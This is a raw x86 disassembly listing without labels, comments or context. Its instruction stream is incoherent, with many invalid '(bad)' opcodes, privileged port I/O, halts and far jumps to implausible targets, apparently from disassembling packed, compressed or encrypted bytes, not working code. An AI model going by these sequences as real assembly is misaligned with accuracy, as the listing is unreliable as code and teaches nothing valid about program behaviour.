  40b3bd:	scas   al,BYTE PTR es:[edi]
  40b3be:	sti    
  40b3bf:	pop    eax
  40b3c0:	fnstsw WORD PTR [esi]
  40b3c2:	scas   eax,DWORD PTR es:[edi]
  40b3c3:	ret    0xc494
  40b3c6:	mov    eax,ds:0xd70f9e6c
  40b3cb:	dec    eax
  40b3cc:	mov    eax,0x316bf6e3
  40b3d1:	push   eax
  40b3d2:	xchg   esp,eax
  40b3d3:	out    0x86,al
  40b3d5:	push   edi
  40b3d6:	test   BYTE PTR [ecx+0x37],ah
  40b3d9:	mov    bl,0x24
  40b3db:	into   
  40b3dc:	inc    edi
  40b3dd:	sub    edx,DWORD PTR [ecx]
  40b3df:	lds    esp,FWORD PTR [ecx]
  40b3e1:	out    0x2d,eax
  40b3e3:	mov    ebp,0x8a13c6f7
  40b3e8:	jmp    0x40b423
  40b3ea:	sbb    BYTE PTR [edi+0x3c],cl
  40b3ed:	aad    0x3d
  40b3ef:	leave  
  40b3f0:	pop    ss
  40b3f1:	xor    eax,0x934c116e
  40b3f6:	cdq    
  40b3f7:	xchg   esp,eax
  40b3f8:	xchg   ecx,eax
  40b3f9:	and    al,0xa9
  40b3fb:	outs   dx,BYTE PTR ds:[esi]
  40b3fc:	push   ds
  40b3fd:	xor    ch,BYTE PTR [esi+0x561ce1cf]
  40b403:	stos   DWORD PTR es:[edi],eax
  40b404:	jl     0x40b42c
  40b406:	add    eax,0x527767a2
  40b40b:	mov    bl,BYTE PTR [ebx]
  40b40d:	push   esi
  40b40e:	fistp  DWORD PTR ds:0xab4f9999
  40b414:	fstp   DWORD PTR [ebp+ecx*1+0x3abd7e]
  40b41b:	add    bl,dl
  40b41d:	test   al,0x26
  40b41f:	jmp    0x40b3c6
  40b421:	(bad)  
  40b422:	lea    esi,[edi-0x65]
  40b425:	dec    ebx
  40b426:	out    0xd3,al
  40b428:	rcl    DWORD PTR [ebx+0xf],cl
  40b42b:	rcl    ebx,cl
  40b42d:	sub    BYTE PTR [edi-0x5370285],al
  40b433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b434:	test   al,0x41
  40b436:	mov    cl,0xd5
  40b438:	jl     0x40b4b9
  40b43a:	or     eax,0xde54851a
  40b43f:	xchg   DWORD PTR [ebx],esp
  40b441:	es int3 
  40b443:	xor    ecx,DWORD PTR [ebp-0x55]
  40b446:	lods   al,BYTE PTR ds:[esi]
  40b447:	xlat   BYTE PTR ds:[ebx]
  40b448:	pop    edi
  40b449:	sub    edi,ebx
  40b44b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b44c:	pop    eax
  40b44d:	pop    ebx
  40b44e:	ret    0x9dea
  40b451:	retf   
  40b452:	ffreep st(0)
  40b454:	sub    DWORD PTR [eax+0x22],edx
  40b457:	inc    esp
  40b458:	fdiv   QWORD PTR [edi-0x2]
  40b45b:	jno    0x40b406
  40b45d:	mov    bl,0x65
  40b45f:	aaa    
  40b460:	push   eax
  40b461:	out    0x20,eax
  40b463:	int    0x53
  40b465:	cld    
  40b466:	adc    esi,edi
  40b468:	inc    eax
  40b469:	cmp    ebp,DWORD PTR [ecx+0x12]
  40b46c:	jae    0x40b452
  40b46e:	jg     0x40b495
  40b470:	shl    DWORD PTR [esi-0x29],cl
  40b473:	jl     0x40b456
  40b475:	pop    esi
  40b476:	lahf   
  40b477:	pop    es
  40b478:	shl    BYTE PTR [eax-0x72],1
  40b47b:	pop    esi
  40b47c:	in     al,dx
  40b47d:	cdq    
  40b47e:	inc    edx
  40b47f:	and    BYTE PTR [ebx+0x26e8b937],ch
  40b485:	lahf   
  40b486:	jbe    0x40b474
  40b488:	dec    esi
  40b489:	dec    ecx
  40b48a:	inc    ecx
  40b48b:	jbe    0x40b4d9
  40b48d:	jbe    0x40b4af
  40b48f:	loopne 0x40b4fe
  40b491:	popa   
  40b492:	jne    0x40b4ce
  40b494:	sub    DWORD PTR [ebx-0x45129127],ecx
  40b49a:	and    al,BYTE PTR [edx]
  40b49c:	mov    dh,0xde
  40b49e:	xchg   ecx,eax
  40b49f:	fwait
  40b4a0:	mov    eax,0x6680b214
  40b4a5:	add    ecx,ecx
  40b4a7:	or     eax,0x6111c2a9
  40b4ac:	sbb    dh,ah
  40b4ae:	loop   0x40b527
  40b4b0:	pop    edx
  40b4b1:	nop
  40b4b2:	xor    esp,ecx
  40b4b4:	push   edi
  40b4b5:	lods   al,BYTE PTR ds:[esi]
  40b4b6:	mov    ch,0xc
  40b4b9:	ja     0x40b4db
  40b4bb:	xchg   ecx,eax
  40b4bc:	lods   eax,DWORD PTR ds:[esi]
  40b4bd:	ja     0x40b455
  40b4bf:	dec    esp
  40b4c0:	punpcklbw mm3,DWORD PTR [edx]
  40b4c3:	enter  0x78c7,0x36
  40b4c7:	test   al,0xba
  40b4c9:	xchg   edi,eax
  40b4ca:	fisubr DWORD PTR [edi]
  40b4cc:	sbb    al,0x63
  40b4ce:	ins    DWORD PTR es:[edi],dx
  40b4cf:	jmp    0xd782:0x6b9193c2
  40b4d6:	scas   al,BYTE PTR es:[edi]
  40b4d7:	adc    DWORD PTR [ebx+0x3e],0x22
  40b4db:	mov    edi,DWORD PTR [eax]
  40b4dd:	sti    
  40b4de:	loop   0x40b4e3
  40b4e0:	in     al,dx
  40b4e1:	pop    ecx
  40b4e2:	in     eax,0x6a
  40b4e4:	xchg   edi,eax
  40b4e5:	add    eax,0x4a9e8873
  40b4ea:	or     BYTE PTR [edi-0x2b9e0cf8],bh
  40b4f0:	fist   WORD PTR [eax-0x4060b26]
  40b4f6:	push   0xabf9a6b2
  40b4fb:	cld    
  40b4fc:	test   al,0xb8
  40b4fe:	popf   
  40b4ff:	mov    ebp,0xa03e5197
  40b504:	retf   
  40b505:	jp     0x40b495
  40b507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b508:	mov    al,ds:0x37b4a0e1
  40b50d:	hlt    
  40b50e:	fcmovbe st,st(7)
  40b510:	in     eax,0x8c
  40b512:	call   0x2b6e756d
  40b517:	hlt    
  40b518:	dec    edi
  40b519:	sti    
  40b51a:	pop    edi
  40b51b:	cdq    
  40b51c:	and    al,0xa2
  40b51e:	jg     0x40b574
  40b520:	ret    0x40a2
  40b523:	adc    al,0x2a
  40b525:	ds es addr16 pop edx
  40b529:	inc    esp
  40b52a:	pop    ebx
  40b52b:	jne    0x40b4d8
  40b52d:	add    DWORD PTR [esi+0x50],ebp
  40b530:	sti    
  40b531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b532:	push   edi
  40b533:	outs   dx,BYTE PTR ds:[esi]
  40b534:	mov    edi,DWORD PTR [ecx]
  40b536:	add    al,0x99
  40b538:	inc    ebp
  40b539:	push   ds
  40b53a:	sbb    DWORD PTR [edi],edi
  40b53c:	dec    edx
  40b53d:	cdq    
  40b53e:	inc    esp
  40b53f:	mov    esp,ecx
  40b541:	popf   
  40b542:	adc    BYTE PTR [ebx-0x64],dh
  40b545:	je     0x40b563
  40b547:	sub    al,0x1
  40b549:	dec    esp
  40b54a:	push   ss
  40b54b:	push   es
  40b54c:	les    edx,FWORD PTR [eax+ebx*2+0x632c60e]
  40b553:	xor    ecx,esp
  40b555:	jae    0x40b4d7
  40b557:	(bad)  
  40b558:	or     al,0x59
  40b55a:	mov    edx,0x7cd0e3c8
  40b55f:	ret    
  40b560:	out    0x31,eax
  40b562:	cwde   
  40b563:	out    0xb4,eax
  40b565:	mov    cs:0x73d46daf,al
  40b56b:	xchg   esi,eax
  40b56c:	cmp    DWORD PTR [eax-0x466d9452],esi
  40b572:	dec    ecx
  40b573:	push   cs
  40b574:	ja     0x40b5a1
  40b576:	retf   0xcf00
  40b579:	into   
  40b57a:	repnz xor DWORD PTR [ebx+0x2681b712],esi
  40b581:	dec    si
  40b583:	std    
  40b584:	cmp    ebx,0xd5d6165e
  40b58a:	mov    ds:0xb1131676,eax
  40b58f:	les    ecx,FWORD PTR [ecx+0x635ee23a]
  40b595:	out    0x75,eax
  40b597:	leave  
  40b598:	repnz (bad) 
  40b59a:	in     eax,dx
  40b59b:	mov    ebp,0xcfd98ded
  40b5a0:	out    dx,eax
  40b5a1:	nop
  40b5a2:	(bad)  
  40b5a3:	mov    ebp,0x1f614721
  40b5a8:	jp     0x40b5f0
  40b5aa:	jge    0x40b583
  40b5ac:	fcomp  QWORD PTR [eax]
  40b5ae:	jbe    0x40b5ee
  40b5b0:	ror    BYTE PTR [eax],0xb2
  40b5b3:	inc    esp
  40b5b4:	sbb    ch,BYTE PTR [esi]
  40b5b6:	add    DWORD PTR [ecx],esi
  40b5b8:	arpl   WORD PTR [esi-0x62],cx
  40b5bb:	cmp    DWORD PTR [eax+ebp*4],edx
  40b5be:	mov    bh,0x62
  40b5c0:	cmc    
  40b5c1:	sahf   
  40b5c2:	push   ss
  40b5c3:	push   eax
  40b5c4:	adc    eax,0x2b76aa5e
  40b5c9:	pop    ecx
  40b5ca:	add    eax,edi
  40b5cc:	hlt    
  40b5cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5ce:	add    eax,0x494dd6fa
  40b5d3:	sahf   
  40b5d4:	int    0xff
  40b5d6:	daa    
  40b5d7:	repz add DWORD PTR [eax],edi
  40b5da:	scas   al,BYTE PTR es:[edi]
  40b5db:	gs pop es
  40b5dd:	aam    0x8c
  40b5df:	je     0x40b619
  40b5e1:	in     al,0x10
  40b5e3:	dec    edi
  40b5e4:	sbb    bl,dh
  40b5e6:	mov    bl,BYTE PTR [esi-0x6d]
  40b5e9:	xor    eax,0xe1f3231
  40b5ee:	sbb    bh,BYTE PTR [esi-0x74]
  40b5f1:	xor    BYTE PTR fs:[esp+ebx*2],0xb2
  40b5f6:	js     0x40b625
  40b5f8:	cmp    BYTE PTR [ebp+0x86fa185],0xc1
  40b5ff:	ja     0x40b600
  40b601:	or     edi,DWORD PTR [esp+edx*2+0x5b5a2ec0]
  40b608:	mov    ebx,0x8f49cf28
  40b60d:	jle    0x40b606
  40b60f:	push   ebp
  40b610:	dec    ebp
  40b611:	add    esp,esi
  40b613:	dec    ebp
  40b614:	sub    DWORD PTR [eax],ebx
  40b616:	enter  0x8234,0x65
  40b61a:	fwait
  40b61b:	sbb    eax,DWORD PTR [edi+0x53]
  40b61e:	mov    edi,0x4a28edf4
  40b623:	cmp    dh,BYTE PTR [ecx-0x1f7b299f]
  40b629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b62a:	dec    ebp
  40b62b:	fs push edi
  40b62d:	pushf  
  40b62e:	out    0x59,eax
  40b630:	test   al,0x69
  40b632:	aas    
  40b633:	mov    ds:0x7c0dc755,eax
  40b638:	inc    ecx
  40b639:	adc    al,0x57
  40b63b:	jno    0x40b652
  40b63d:	adc    eax,0xf7c2368c
  40b642:	fwait
  40b643:	and    eax,0x79da9a3a
  40b648:	mov    ?,WORD PTR [edi]
  40b64a:	(bad)  
  40b64b:	fsub   DWORD PTR [esi-0x4b]
  40b64e:	push   0xffffffac
  40b650:	and    ecx,ebp
  40b652:	cli    
  40b653:	inc    esi
  40b654:	dec    ebp
  40b655:	repnz cmp eax,0x4de0de93
  40b65b:	pop    ecx
  40b65c:	call   0x4826:0x10d7fe97
  40b663:	mov    esp,0x2bab7bc7
  40b668:	mov    ds:0xe998c412,eax
  40b66d:	jbe    0x40b679
  40b66f:	cmp    dh,bl
  40b671:	(bad)  
  40b672:	into   
  40b673:	jmp    0x59fb:0xe93f13a6
  40b67a:	or     dh,BYTE PTR [ebx+ebx*8+0xcf8175f]
  40b681:	das    
  40b682:	jl     0x40b676
  40b684:	fcmovnb st,st(2)
  40b686:	cmc    
  40b687:	or     edx,DWORD PTR [ebp-0x47]
  40b68a:	xchg   edx,ebx
  40b68c:	je     0x40b6d4
  40b68e:	nop
  40b68f:	bound  esp,QWORD PTR [esi+0x4d]
  40b692:	(bad)  
  40b693:	addr16 out 0x94,al
  40b696:	mov    ebx,eax
  40b698:	or     al,0x43
  40b69a:	xchg   BYTE PTR [ecx+0x20],bl
  40b69d:	aam    0xfe
  40b69f:	push   ebx
  40b6a0:	and    DWORD PTR [edi+0x382aff41],ebp
  40b6a6:	jmp    0x40b63f
  40b6a8:	sub    BYTE PTR [esi+0x5b],ch
  40b6ab:	(bad)  
  40b6ac:	test   eax,0x275ca2b0
  40b6b1:	jmp    0xbddc7541
  40b6b6:	pop    ecx
  40b6b7:	mov    BYTE PTR [esi],ch
  40b6b9:	retf   0x78b0
  40b6bc:	mov    esi,0x8ea7cb74
  40b6c1:	sbb    edx,ebx
  40b6c3:	add    BYTE PTR [edi+0x52],dl
  40b6c6:	jle    0x40b670
  40b6c8:	imul   ebx,DWORD PTR [edi],0x63
  40b6cb:	fst    QWORD PTR [esi-0x1fc3c415]
  40b6d1:	add    edx,DWORD PTR es:[esi+edx*2]
  40b6d5:	jg     0x40b718
  40b6d7:	pinsrw mm4,WORD PTR [edi-0x32],0x35
  40b6dc:	pop    ss
  40b6dd:	jns    0x40b680
  40b6df:	jge    0x40b708
  40b6e1:	inc    edi
  40b6e2:	and    eax,0xebce3e5
  40b6e7:	fist   WORD PTR [esi+eax*2-0x7c]
  40b6eb:	inc    ebp
  40b6ec:	aad    0x67
  40b6ee:	div    DWORD PTR [esi+edx*2+0x1b]
  40b6f2:	and    ch,BYTE PTR [eax+edx*1-0x7a]
  40b6f6:	cmp    DWORD PTR [edx-0x4fb1e05],eax
  40b6fc:	adc    DWORD PTR [eax+0x30],edx
  40b6ff:	xchg   ebx,eax
  40b700:	cli    
  40b701:	out    0x6,eax
  40b703:	les    esp,FWORD PTR [edx+0x78925661]
  40b709:	mov    esp,0x60426a40
  40b70e:	xor    eax,0x33e4637
  40b713:	test   al,0x3d
  40b715:	leave  
  40b716:	xor    ch,BYTE PTR [esi]
  40b718:	sahf   
  40b719:	pop    edi
  40b71a:	ss ds hlt 
  40b71d:	daa    
  40b71e:	call   0xecaf7705
  40b723:	mov    ah,0x62
  40b725:	push   esi
  40b726:	fild   WORD PTR [edx+edx*8]
  40b729:	mov    bl,0x9a
  40b72c:	std    
  40b72d:	hlt    
  40b72e:	xor    DWORD PTR [eax+eax*2+0xf8e6527],esp
  40b735:	xor    BYTE PTR [edi],ch
  40b737:	inc    ebx
  40b738:	mov    esp,0x3ac69208
  40b73d:	ret    
  40b73e:	test   eax,0x79188b76
  40b743:	or     al,0x93
  40b745:	hlt    
  40b746:	daa    
  40b747:	cdq    
  40b748:	sahf   
  40b749:	jbe    0x40b79c
  40b74b:	jno    0x40b75b
  40b74d:	lahf   
  40b74e:	stc    
  40b74f:	adc    DWORD PTR [ecx-0x12],ebp
  40b752:	jae    0x40b7b2
  40b754:	push   ds
  40b755:	add    eax,0xabc381a6
  40b75a:	jmp    0x15b2:0x1ca84be6
  40b761:	(bad)  
  40b762:	dec    ecx
  40b763:	push   ebx
  40b764:	icebp  
  40b765:	sti    
  40b766:	xchg   ecx,eax
  40b767:	jne    0x40b71a
  40b769:	fistp  DWORD PTR [edi]
  40b76b:	sbb    edi,DWORD PTR [eax-0x78]
  40b76e:	cwde   
  40b76f:	addr16 test ecx,esp
  40b772:	inc    esi
  40b773:	rcl    DWORD PTR [edx],cl
  40b775:	add    eax,ecx
  40b777:	mov    ch,0x9d
  40b779:	shl    DWORD PTR [ebx+edx*4],1
  40b77c:	add    ebp,DWORD PTR [ebp+esi*2+0x4073fbe]
  40b783:	adc    eax,DWORD PTR [ebp-0x54144f32]
  40b789:	mov    WORD PTR ds:0x8d0128ca,ds
  40b78f:	rep stos DWORD PTR es:[edi],eax
  40b791:	enter  0x47f3,0x81
  40b795:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40b797:	push   0x503fb6b1
  40b79c:	xchg   edi,eax
  40b79d:	xchg   ebx,eax
  40b79e:	ins    DWORD PTR es:[edi],dx
  40b79f:	mov    al,ds:0xc69f8755
  40b7a4:	aas    
  40b7a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7a6:	lea    ebp,[ecx]
  40b7a8:	lea    eax,[ecx]
  40b7aa:	in     eax,dx
  40b7ab:	and    DWORD PTR [ecx+0x51],edx
  40b7ae:	and    eax,ebx
  40b7b0:	jl     0x40b805
  40b7b2:	add    eax,0xa4e02f8f
  40b7b7:	int    0xd6
  40b7b9:	ds nop
  40b7bb:	mov    ds:0xefb1ea72,eax
  40b7c0:	pushf  
  40b7c1:	lds    edx,FWORD PTR [ecx]
  40b7c3:	(bad)  
  40b7c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7c5:	cld    
  40b7c6:	into   
  40b7c7:	add    dh,BYTE PTR [edx]
  40b7c9:	cli    
  40b7ca:	mov    al,0x58
  40b7cc:	fisttp WORD PTR [esi]
  40b7ce:	shl    al,cl
  40b7d0:	(bad)  
  40b7d1:	dec    eax
  40b7d2:	sbb    DWORD PTR [edi+0x21a37848],0xd44ab286
  40b7dc:	or     DWORD PTR [edi+0x1e7d52c3],ecx
  40b7e2:	repnz ins BYTE PTR es:[edi],dx
  40b7e4:	push   ds
  40b7e5:	mov    cs,esp
  40b7e7:	mov    ch,0xc7
  40b7e9:	pusha  
  40b7ea:	fstp   DWORD PTR [ebx+edi*4]
  40b7ed:	pusha  
  40b7ee:	hlt    
  40b7ef:	cmp    eax,0xb9eafd2a
  40b7f4:	daa    
  40b7f5:	push   0xffffffe2
  40b7f7:	and    ecx,DWORD PTR [edi-0x4326e86]
  40b7fd:	mov    ds:0x99f1dcc5,al
  40b802:	cmp    edi,eax
  40b804:	out    0x4d,eax
  40b806:	xor    eax,0x791726b4
  40b80b:	or     eax,0x9d587a9b
  40b810:	mov    ds:0xab7d6eeb,al
  40b815:	bound  esp,QWORD PTR [edi]
  40b817:	lahf   
  40b818:	adc    ch,dh
  40b81a:	adc    al,0x6e
  40b81c:	xor    al,bl
  40b81e:	mov    WORD PTR [si],?
  40b821:	aaa    
  40b822:	shl    DWORD PTR [edx+esi*8-0x77cef6a5],cl
  40b829:	sahf   
  40b82a:	dec    eax
  40b82b:	sub    esi,edx
  40b82d:	and    dl,BYTE PTR [edi+0x6aa2b183]
  40b833:	mov    ecx,0xc59d748
  40b838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b839:	fcomip st,st(7)
  40b83b:	and    ebp,esi
  40b83d:	sub    eax,0xcd42c9ec
  40b842:	adc    ah,BYTE PTR [edi-0x3b26192a]
  40b848:	mov    esi,0xfa18862
  40b84d:	push   0x7bed7e5
  40b852:	iret   
  40b853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b854:	mov    eax,0x6056835c
  40b859:	sahf   
  40b85a:	add    BYTE PTR [ecx-0x6e],dh
  40b85d:	adc    ecx,esp
  40b85f:	scas   al,BYTE PTR es:[edi]
  40b860:	xchg   ebp,eax
  40b861:	cmp    BYTE PTR [ebx-0xc],0x18
  40b865:	add    ah,dh
  40b867:	adc    eax,ecx
  40b869:	iret   
  40b86a:	jge    0x40b86c
  40b86c:	adc    bl,cl
  40b86e:	adc    cl,BYTE PTR [edi+ebp*1]
  40b871:	mov    ebp,0xcbff9680
  40b876:	inc    esp
  40b877:	cdq    
  40b878:	adc    eax,ecx
  40b87a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b87b:	adc    DWORD PTR [edi],edi
  40b87d:	or     DWORD PTR [edx+0xa],edx
  40b880:	bound  edi,QWORD PTR [esi-0x4f]
  40b883:	pop    ss
  40b884:	or     al,0xd7
  40b886:	add    dl,BYTE PTR [eax+eax*1-0x2]
  40b88a:	push   cs
  40b88b:	bound  ebx,QWORD PTR [esi+ebx*8]
  40b88e:	jo     0x40b829
  40b890:	adc    eax,0xaa75bf6e
  40b895:	inc    esp
  40b896:	icebp  
  40b897:	jmp    FWORD PTR [edx+edi*1]
  40b89a:	inc    esp
  40b89b:	dec    eax
  40b89c:	mov    ecx,0xdf250729
  40b8a1:	js     0x40b85f
  40b8a3:	cli    
  40b8a4:	sub    al,0x5f
  40b8a6:	xor    eax,DWORD PTR [eax-0x4834566]
  40b8ac:	cmp    dl,dl
  40b8ae:	out    0xea,eax
  40b8b0:	jns    0x40b8f0
  40b8b2:	loop   0x40b8e5
  40b8b4:	sub    al,al
  40b8b6:	fdivrp st(7),st
  40b8b8:	jp     0x40b8c0
  40b8ba:	loop   0x40b931
  40b8bc:	jo     0x40b8ab
  40b8be:	push   ebx
  40b8bf:	(bad)  [edi-0x2f2c3645]
  40b8c5:	iret   
  40b8c6:	std    
  40b8c7:	mov    cl,ch
  40b8c9:	push   0x29fe94a2
  40b8ce:	out    dx,al
  40b8cf:	aaa    
  40b8d0:	cdq    
  40b8d1:	pusha  
  40b8d2:	cmp    al,BYTE PTR [eax-0x12]
  40b8d5:	add    bh,dh
  40b8d7:	jg     0x40b957
  40b8d9:	push   eax
  40b8da:	int    0xf4
  40b8dc:	or     eax,0x7b8e9929
  40b8e1:	or     dh,BYTE PTR [edi+0x59]
  40b8e4:	cmp    eax,0x60c18297
  40b8e9:	frndint 
  40b8eb:	jnp    0x40b8f9
  40b8ed:	icebp  
  40b8ee:	sti    
  40b8ef:	je     0x40b95a
  40b8f1:	stc    
  40b8f2:	stos   BYTE PTR es:[edi],al
  40b8f3:	repnz adc ch,BYTE PTR [eax+0x1a]
  40b8f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8f8:	xchg   BYTE PTR [ebx],ch
  40b8fa:	pop    ebx
  40b8fb:	or     DWORD PTR [edi-0x1ecae079],ecx
  40b901:	cmp    edi,edi
  40b903:	jl     0x40b8bf
  40b905:	cmc    
  40b906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b907:	push   0xbb4585c6
  40b90c:	xchg   BYTE PTR [edi],dh
  40b90e:	fs jecxz 0x40b892
  40b911:	clc    
  40b912:	cmp    ah,BYTE PTR [edx]
  40b914:	icebp  
  40b915:	sub    al,BYTE PTR [ebp+0x363fdf93]
  40b91b:	sar    BYTE PTR [ebx],cl
  40b91d:	pop    esp
  40b91e:	inc    DWORD PTR [edi+0x42]
  40b921:	mov    bh,0xe3
  40b923:	gs hlt 
  40b925:	enter  0x3e60,0x16
  40b929:	jae    0x40b944
  40b92b:	sar    DWORD PTR [esi+0x28],0x7f
  40b92f:	jmp    0x40b8b3
  40b931:	pop    esp
  40b932:	iret   
  40b933:	push   0xc2a4ba9c
  40b938:	jecxz  0x40b979
  40b93a:	int3   
  40b93b:	pop    edx
  40b93c:	pop    es
  40b93d:	xor    DWORD PTR [ebp+0x5],esi
  40b940:	fimul  DWORD PTR [eax]
  40b942:	sbb    BYTE PTR [ebx],dh
  40b944:	div    BYTE PTR [edx+0x6a]
  40b947:	shl    DWORD PTR [ebx+0x5e],0x36
  40b94b:	pop    edx
  40b94c:	push   ds
  40b94d:	cli    
  40b94e:	or     dl,al
  40b950:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b951:	repz xor DWORD PTR [ebx-0x7fd23843],eax
  40b958:	xor    esi,ebx
  40b95a:	ficomp DWORD PTR [edx+eax*2-0xb8b8ed3]
  40b961:	jmp    0x2d37:0x95506545
  40b968:	int    0x87
  40b96a:	outs   dx,BYTE PTR ss:[esi]
  40b96c:	and    BYTE PTR [ebp-0x41cc34b5],bh
  40b972:	mov    ecx,edx
  40b974:	inc    ebp
  40b975:	xor    BYTE PTR [di-0x1313],bh
  40b97a:	cmp    BYTE PTR [eax-0x6f],ah
  40b97d:	inc    ecx
  40b97e:	add    DWORD PTR [edi],0xc989b5dc
  40b984:	inc    edx
  40b985:	dec    esp
  40b986:	dec    edi
  40b987:	out    0xd9,al
  40b989:	inc    eax
  40b98a:	clc    
  40b98b:	xor    ebx,DWORD PTR [edi]
  40b98d:	xchg   ebx,eax
  40b98f:	mov    dl,0x31
  40b991:	cmp    al,0x9e
  40b993:	jg     0x40b9ed
  40b995:	xchg   edx,eax
  40b996:	sbb    eax,0x6df4fca8
  40b99b:	mov    esi,DWORD PTR [esi]
  40b99d:	nop
  40b99e:	lahf   
  40b99f:	or     DWORD PTR [ecx-0x14],0xae839250
  40b9a6:	pop    esi
  40b9a7:	arpl   WORD PTR [esp+ebp*2],ax
  40b9aa:	xchg   ebp,eax
  40b9ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9ac:	scas   eax,DWORD PTR es:[edi]
  40b9ad:	bound  esp,QWORD PTR [ecx]
  40b9af:	outs   dx,DWORD PTR ds:[esi]
  40b9b0:	loope  0x40ba2b
  40b9b2:	and    al,0x12
  40b9b4:	mov    ds:0x106695a2,al
  40b9b9:	je     0x40b98c
  40b9bb:	push   ecx
  40b9bc:	nop
  40b9bd:	nop
  40b9be:	into   
  40b9bf:	jge    0x40ba23
  40b9c1:	xchg   esp,eax
  40b9c2:	rol    DWORD PTR [esi-0x555b2e41],cl
  40b9c8:	fwait
  40b9c9:	sub    eax,0xc49f353d
  40b9ce:	sbb    al,0x4a
  40b9d0:	push   esp
  40b9d1:	into   
  40b9d2:	fmul   st(5),st
  40b9d4:	jb     0x40b975
  40b9d6:	into   
  40b9d7:	rcl    DWORD PTR [eax+0x7544c75f],1
  40b9dd:	int    0x53
  40b9df:	jo     0x40ba25
  40b9e1:	xchg   edi,eax
  40b9e2:	xchg   edx,eax
  40b9e3:	dec    ebp
  40b9e4:	aaa    
  40b9e5:	call   0xf7de0945
  40b9ea:	lods   eax,DWORD PTR ds:[esi]
  40b9eb:	and    esi,DWORD PTR [ebp+0x70]
  40b9ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9ef:	jb     0x40ba23
  40b9f1:	pop    edx
  40b9f2:	retf   
  40b9f3:	mov    edi,DWORD PTR [eax+0x55]
  40b9f6:	push   ds
  40b9f7:	add    al,0x30
  40b9f9:	test   DWORD PTR [ebp-0x5e8650f0],ebx
  40b9ff:	dec    ebp
  40ba00:	jne    0x40ba60
  40ba02:	push   ecx
  40ba03:	in     eax,0xda
  40ba05:	mov    edi,DWORD PTR [esi+ecx*2]
  40ba08:	cwde   
  40ba09:	pop    es
  40ba0a:	es adc al,0xc0
  40ba0d:	ja     0x40b9ff
  40ba0f:	sub    bl,BYTE PTR [edi+0x4df06ec0]
  40ba15:	je     0x40ba58
  40ba17:	test   ecx,esp
  40ba19:	into   
  40ba1a:	jmp    0x8c2fb708
  40ba1f:	jp     0x40b9ab
  40ba21:	pop    ebp
  40ba22:	rcl    DWORD PTR [ecx+0x7914b743],1
  40ba28:	jp     0x40ba9a
  40ba2a:	mov    esp,0x1d2d8e92
  40ba2f:	mov    dl,0xbf
  40ba31:	pop    eax
  40ba32:	pushf  
  40ba33:	data16 sbb BYTE PTR [eax+edi*8+0x7ccac9c8],dl
  40ba3b:	sbb    eax,0x5c2f9c7a
  40ba40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba41:	ret    
  40ba42:	or     al,0x60
  40ba44:	cs xchg ebp,eax
  40ba46:	xor    bl,BYTE PTR [ecx+0x38]
  40ba49:	jo     0x40ba87
  40ba4b:	lods   al,BYTE PTR ds:[esi]
  40ba4c:	je     0x40ba35
  40ba4e:	unpcklps xmm2,XMMWORD PTR ds:0x6d799a1f
  40ba55:	repnz (bad) 
  40ba57:	mov    ebp,0x18bc3c50
  40ba5c:	mov    edi,0x4b644bfb
  40ba61:	call   0xce74:0xe9c81128
  40ba68:	mov    ds:0x39f37e0,al
  40ba6d:	push   esi
  40ba6e:	inc    esp
  40ba6f:	jns    0x40ba6d
  40ba71:	pop    esi
  40ba72:	rcr    esp,0xa5
  40ba75:	add    eax,0xcdec4d5d
  40ba7a:	enter  0x9df6,0xe
  40ba7e:	and    al,0x11
  40ba80:	das    
  40ba81:	and    eax,0xb94e006b
  40ba86:	or     bl,BYTE PTR [ecx+0x72f3fcd0]
  40ba8c:	mov    eax,0xf0a873d4
  40ba91:	fmul   QWORD PTR [ebx-0x49]
  40ba94:	pop    es
  40ba95:	push   eax
  40ba96:	push   ecx
  40ba97:	or     edx,DWORD PTR [ecx-0x52cd21f]
  40ba9d:	cwde   
  40ba9e:	cdq    
  40ba9f:	lds    esp,FWORD PTR [eax]
  40baa1:	(bad)
  40baa4:	push   eax
  40baa5:	imul   esp,DWORD PTR [ebp+0x6],0x3f
  40baa9:	and    eax,0x4a413b0e
  40baae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baaf:	daa    
  40bab0:	pop    esi
  40bab1:	out    dx,al
  40bab2:	out    dx,al
  40bab3:	rcr    BYTE PTR [ebp+0x255a1199],1
  40bab9:	(bad)  
  40baba:	lea    eax,[edi]
  40babc:	nop
  40babd:	pusha  
  40babe:	scas   eax,DWORD PTR es:[edi]
  40babf:	sub    eax,0xa0e8939f
  40bac4:	fiadd  DWORD PTR [ebx+edx*4]
  40bac7:	jae    0x40bae5
  40bac9:	fisub  WORD PTR [edx]
  40bacb:	js     0x40bb4b
  40bacd:	dec    esi
  40bace:	jns    0x40baa6
  40bad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bad1:	mov    BYTE PTR [edi+esi*8-0x7b4d961f],bh
  40bad8:	push   esp
  40bad9:	dec    ecx
  40bada:	popa   
  40badb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40badc:	cld    
  40badd:	ins    DWORD PTR es:[edi],dx
  40bade:	inc    ebx
  40badf:	fwait
  40bae0:	or     ebp,ebp
  40bae2:	clc    
  40bae3:	popa   
  40bae4:	and    al,0x49
  40bae6:	mov    edi,0x7d525ea6
  40baeb:	xor    al,0xb6
  40baed:	iret   
  40baee:	add    eax,0x5a48d889
  40baf3:	sti    
  40baf4:	xchg   edx,eax
